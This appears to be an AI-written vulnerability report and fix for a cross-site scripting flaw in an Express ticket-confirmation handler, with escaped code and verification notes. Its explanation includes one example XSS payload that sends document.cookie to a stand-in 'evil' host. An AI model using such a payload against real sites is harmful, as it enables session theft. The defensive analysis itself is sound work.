## Verdict

Exploitable. CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')), confirmed at `ExpressDirectHtmlRender.js:30`.

## Source

Two attacker-controlled inputs reach the sink with no encoding in between:

- `req.params.id` - the `:id` route parameter from `GET /tickets/:id/confirmation`, used both as a lookup key and interpolated directly into the response.
- `req.query.note` - the `note` query-string parameter, assigned to `closingNote` and interpolated directly into the response.

Both flow straight from the Express request object into the template literal built at lines 19-27, with no validation, encoding, or escaping applied.

## Fix

### File: ExpressDirectHtmlRender.js

```javascript
const express = require('express');
const app = express();

// In-memory store of support tickets, keyed by id.
const tickets = {
    'T-1001': { subject: 'Printer will not turn on', status: 'Open' }
};

// Minimal HTML-entity encoder for interpolating untrusted values into HTML
// body text. Escapes the characters that let a value break out of text
// context into markup or start a new tag/attribute.
function escapeHtml(value) {
    return String(value).replace(/[&<>"']/g, (ch) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }[ch]));
}

app.get('/tickets/:id/confirmation', (req, res) => {
    const ticket = tickets[req.params.id];
    if (!ticket) {
        return res.status(404).send('Ticket not found');
    }

    // Agents can append a short note when closing a ticket; it arrives as a
    // query parameter from the "close ticket" form and is never persisted.
    const closingNote = req.query.note || '';

    const page = `
        <html>
            <body>
                <h1>Ticket ${escapeHtml(req.params.id)} - ${ticket.subject}</h1>
                <p>Status: ${ticket.status}</p>
                <p>Agent note: ${escapeHtml(closingNote)}</p>
            </body>
        </html>
    `;

    res.send(page);
});

module.exports = app;
```

## Explanation

The handler built a full HTML document as a template literal and passed it straight to `res.send()` - one of the sinks the JavaScript CWE-79 guidance names explicitly ("`res.send()`/`res.write()` built from a template literal") - with no templating engine and therefore no auto-escaping in between. `req.params.id` and `req.query.note` are both attacker-controlled and land in an HTML body-text context (inside `<h1>` and `<p>`), so a payload such as `note=<script>fetch('//evil/?c='+document.cookie)</script>` would execute in the agent's browser when they open the confirmation page. The fix adds a small dependency-free `escapeHtml()` helper that HTML-entity-encodes `& < > " '` and applies it at the point of interpolation for both tainted values, per the general guidance's "encode at each output sink" principle. `ticket.subject` and `ticket.status` come from the server-side in-memory store, not from the request, so they are left as-is - encoding them would be a no-op change unrelated to the finding. No third-party sanitization library was introduced: the values are plain text (not rich HTML) rendered into HTML body text, so entity-encoding closes the weakness without any of DOMPurify's markup-sanitization surface being needed, and no dependency is available or verified in this single-file case for that purpose anyway.

## Behaviour changes

- Ticket IDs or agent notes that contain `& < > " '` now render as their literal HTML-entity form (e.g. a note of `<b>urgent</b>` displays as the literal text `<b>urgent</b>` instead of being rendered as bold or executed as script). This is the intended effect of the fix: previously such input was interpreted as markup/script; now it always displays as inert text. No other change: response status, `Content-Type` inference (still a plain string passed to `res.send()`), and the 404 branch are all unchanged.
- **Verification**: `node --check` against the fixed file in a scratch copy - passed with no syntax errors. The `escapeHtml()` logic was also run standalone against a `<script>` payload (correctly encoded to inert text), the benign ticket ID `T-1001` (passed through unchanged), and a benign note containing `&`/quotes (entity-encoded, renders identically in a browser).
- **Assumptions**: none needed - the sink and taint sources matched the JavaScript guidance's named pattern directly (`res.send()` built from a template literal), so no ambiguity had to be resolved.
